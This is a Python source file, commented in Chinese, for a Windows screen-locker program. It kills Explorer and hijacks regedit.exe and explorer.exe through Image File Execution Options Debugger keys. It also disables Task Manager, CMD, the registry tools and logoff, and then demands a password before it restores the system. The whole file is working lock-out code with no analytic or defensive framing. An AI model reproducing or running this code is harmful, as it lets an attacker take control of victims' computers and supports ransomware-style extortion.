import ctypes
import os
import sys
# 获取控制台窗口句柄
kernel32 = ctypes.WinDLL('kernel32')
user32 = ctypes.WinDLL('user32')
hwnd = kernel32.GetConsoleWindow()
# 禁用关闭按钮（灰色不可点击）
if hwnd:
    user32.EnableMenuItem(user32.GetSystemMenu(hwnd, False), 0xF060, 0x00000001)
"""
禁用关闭按钮
"""


def disable_logout(enable=False):
    """
    禁用或启用Windows注销功能
    :param enable: False表示禁用，True表示启用
    """
    try:
        # 打开或创建注册表项
        key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        
        # 设置值：1表示禁用注销，0或删除表示启用
        winreg.SetValueEx(key, "StartMenuLogOff", 0, winreg.REG_DWORD, 1 if not enable else 0)
        
        print("注销功能已禁用" if not enable else "注销功能已启用")
    except FileNotFoundError:
        # 如果键不存在则创建
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "StartMenuLogOff", 0, winreg.REG_DWORD, 1 if not enable else 0)
        print("注册表项已创建并设置")
    except Exception as e:
        print(f"操作失败: {e}")
    finally:
        winreg.CloseKey(key)
# 禁用注销
"""
结束资源管理器
"""
def kill_explorer():
    try:
        # 使用taskkill命令结束explorer.exe
        os.system("taskkill /f /im explorer.exe")
        print("资源管理器已结束")
    except Exception as e:
        print(f"结束进程失败: {e}")
"""
禁用任务管理器
"""

import winreg

def hijack_explorer(target_program):
    """
    通过注册表劫持explorer.exe
    :param target_program: 要劫持执行的程序路径
    """
    try:
        # 创建/打开IFEO注册表项
        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        
        # 设置Debugger值为目标程序
        winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, target_program)
        print(f"[+] 劫持成功！explorer.exe将执行: {target_program}")
    except PermissionError:
        print("[-] 错误：需要管理员权限！")
    except Exception as e:
        print(f"[-] 劫持失败: {e}")
    finally:
        winreg.CloseKey(key)


def disable_task_manager(enable=False):
    key_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1 if not enable else 0)
        print("任务管理器已禁用！" if not enable else "任务管理器已启用！")
    except FileNotFoundError:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1 if not enable else 0)
        print("注册表项已创建并禁用任务管理器！")
    finally:
        winreg.CloseKey(key)

def disable_cmd_and_regedit(enable=False):
    key_path = r"SOFTWARE\Policies\Microsoft\Windows\System"
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1 if not enable else 0)
        print("CMD已禁用！" if not enable else "已恢复！")
    except FileNotFoundError:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
        winreg.SetValueEx(key, "DisableCMD", 0, winreg.REG_DWORD, 1 if not enable else 0)
        winreg.SetValueEx(key, "DisableRegistryTools", 0, winreg.REG_DWORD, 1 if not enable else 0)
        print("注册表项已创建并禁用 CMD！")
    finally:
        winreg.CloseKey(key)

def hijack_regedit(target_path):
    """
    劫持 regedit.exe 使其执行指定程序

    """
    try:
        # 打开或创建 IFEO 注册表项
        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe"
        key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        
        # 设置 Debugger 值为目标程序路径
        winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, target_path)
        print(f"[+] 劫持成功！regedit.exe 将执行: {target_path}")
    except PermissionError:
        print("[-] 错误：需要管理员权限！")
    except Exception as e:
        print(f"[-] 劫持失败: {e}")
    finally:
        winreg.CloseKey(key)

def restore_regedit():
    """恢复 regedit.exe 的默认行为（删除劫持）"""
    try:
        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe"
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        print("[+] 恢复成功！regedit.exe 已恢复正常")
    except FileNotFoundError:
        print("[!] 未检测到劫持，无需恢复")
    except PermissionError:
        print("[-] 错误：需要管理员权限！")
    except Exception as e:
        print(f"[-] 恢复失败: {e}")
"""
运行以上函数
"""
kill_explorer()
hijack_regedit(r"c:\Program Files (x86)\suoji\start.exe")# 劫持 regedit 
disable_task_manager(enable=False)#禁用任务管理器
disable_cmd_and_regedit(enable=False)  # 禁用cmd
disable_logout(enable=False)#禁用注销
hijack_explorer(r"sb.exe")
import subprocess

def restart_explorer():
    try:
        subprocess.Popen("explorer.exe")
        print("资源管理器已重启")
    except Exception as e:
        print(f"重启失败: {e}")
#启动资源管理器


print("您的电脑已被锁定，请输入密码解锁")


with open('password.txt', 'r', encoding='utf-8') as file:
    content = file.read()  #读取全部内容

import hashlib

password = 0
while(password!=content):
    password = 0
    password = input("请输入密码：")
    # SHA-256加密
    passworda = hashlib.sha256(password.encode('utf-8')).hexdigest()

    if passworda == content:
        print("密码正确")

        disable_task_manager(enable=True)
        restore_regedit()
        disable_cmd_and_regedit(enable=True)
        key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\explorer.exe"
        winreg.DeleteKey(winreg.HKEY_LOCAL_MACHINE, key_path)
        restart_explorer()
        disable_logout(enable=True)
        
        # 恢复
        break
    else:
        print('密码错误')

input('按任意键退出。')
